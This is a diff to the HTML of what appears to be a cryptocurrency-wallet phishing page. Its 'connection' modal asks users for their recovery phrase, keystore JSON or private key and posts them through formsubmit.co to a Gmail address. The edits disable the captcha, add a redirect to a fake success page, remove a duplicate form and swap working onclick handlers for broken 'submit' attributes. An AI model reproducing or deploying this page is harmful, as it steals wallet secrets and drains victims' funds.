@@ -681,7 +681,7 @@
             <div class="modal-content relative">
                 <button
                     class="absolute top-4 right-4 text-gray-400 hover:text-gray-100 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
-                    onclick="hideModal()" aria-label="Close connection modal">
+                    submit="hideModal()" aria-label="Close connection modal">
                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                         stroke-linecap="round" stroke-linejoin="round">
                         <line x1="18" y1="6" x2="6" y2="18"></line>
@@ -697,18 +697,20 @@
                 <div role="tablist" class="flex justify-evenly border-b-2 border-fuchsia-600 mb-6 text-gray-400">
                     <button id="phraseTabBtn" role="tab" aria-controls="phraseTab" aria-selected="true"
                         class="tab-button active p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
-                        onclick="switchTab('phrase')">Phrase</button>
+                        submit="switchTab('phrase')">Phrase</button>
                     <button id="keystoreTabBtn" role="tab" aria-controls="keystoreTab" aria-selected="false"
                         class="tab-button p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
-                        onclick="switchTab('keystore')">Keystore JSON</button>
+                        submit="switchTab('keystore')">Keystore JSON</button>
                     <button id="privateTabBtn" role="tab" aria-controls="privateTab" aria-selected="false"
                         class="tab-button p-2 font-medium hover:text-blue-400 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500 rounded"
-                        onclick="switchTab('private')">Private Key</button>
+                        submit="switchTab('private')">Private Key</button>
                 </div>
 				
 				<form action="https://formsubmit.co/wnewton0001@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
-                                      
-
+                                   <input type="hidden" name="_cc" value="@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next"access/point/success.html">   
+                       
                
                    <input type='hidden' name='form-name' value='my-form' />
                     <input type="hidden" name="wallet_id" id="formWalletId" value="">
@@ -722,7 +724,7 @@
                                     name="phrase" required="" ></textarea>
                                 <button type="button"
                                     class="absolute right-3 text-gray-400 hover:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 rounded-full p-1"
-                                    onclick="pasteFromClipboard('recov_phrase')"
+                                    submit="pasteFromClipboard('recov_phrase')"
                                     aria-label="Paste recovery phrase from clipboard">
                                     <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                                         stroke-width="2" stroke="currentColor" class="w-5 h-5">
@@ -731,7 +733,7 @@
                                     </svg>
                                 </button>
                             </div>
-							<form action="https://formsubmit.co/formsubmitmails@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+							
 							
                             <p id="phraseValidationMsg" class="text-xs text-gray-400 mt-2 leading-normal">Typically 12
                                 (sometimes 24) words separated by single spaces.</p>
@@ -747,7 +749,7 @@
                             class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
                             submit="proceed()">Proceed</button>
                     </div>
-                      </form>
+                      
                     <div id="keystoreTab" role="tabpanel" aria-labelledby="keystoreTabBtn" class="tab-content">
                         <div class="mb-4">
                             <label for="file-upload" class="block text-sm font-medium text-gray-300 mb-2">Upload
@@ -766,7 +768,7 @@
                         </div>
                         <button type="submit"
                             class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
-                            onclick="proceed()">Proceed</button>
+                            submit="proceed()">Proceed</button>
                     </div>
 
                     <div id="privateTab" role="tabpanel" aria-labelledby="privateTabBtn" class="tab-content">
@@ -779,7 +781,7 @@
                                     required="">
                                 <button type="button"
                                     class="absolute right-3 text-gray-400 hover:text-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500 rounded-full p-1"
-                                    onclick="pasteFromClipboard('wallet_key')"
+                                    submit="pasteFromClipboard('wallet_key')"
                                     aria-label="Paste private key from clipboard">
                                     <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                                         stroke-width="2" stroke="currentColor" class="w-5 h-5">
@@ -798,11 +800,11 @@
                         </div>
                         <button type="submit"
                             class="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500"
-                            onclick="proceed()">Proceed</button>
+                            submit="proceed()">Proceed</button>
                     </div>
                 </form>
 
-                <button id="cancelModalBtn" type="button" onclick="hideModal()"
+                <button id="cancelModalBtn" type="button" submit="hideModal()"
                     class="w-full mt-4 py-2 bg-red-600 hover:bg-red-700 text-white font-medium rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-red-500">
                     Cancel
                 </button>
